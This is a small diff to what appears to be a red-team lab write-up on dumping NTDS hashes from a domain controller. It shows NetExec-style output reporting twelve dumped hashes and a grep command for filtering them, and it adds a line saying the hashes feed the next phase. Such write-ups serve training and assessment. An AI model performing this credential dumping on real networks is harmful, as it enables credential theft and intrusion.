@@ -113,6 +113,8 @@ SMB         192.168.5.134   445    REDTEAMBD-DC     [+] Dumped 12 NTDS hashes to
 SMB         192.168.5.134   445    REDTEAMBD-DC     [*] To extract only enabled accounts from the output file, run the following command: 
 SMB         192.168.5.134   445    REDTEAMBD-DC     [*] grep -iv disabled /root/.nxc/logs/ntds/REDTEAMBD-DC_192.168.5.134_2026-06-06_011030.ntds | cut -d ':' -f1
 ```
+The command completed successfully and extracted the NTLM hashes from the Domain Controller, providing the credential material required for the next phase of the assessment.
+
 <p align="center">
   <img src="/writeups/ntds dump/images/step2.png" width="600">
 </p>
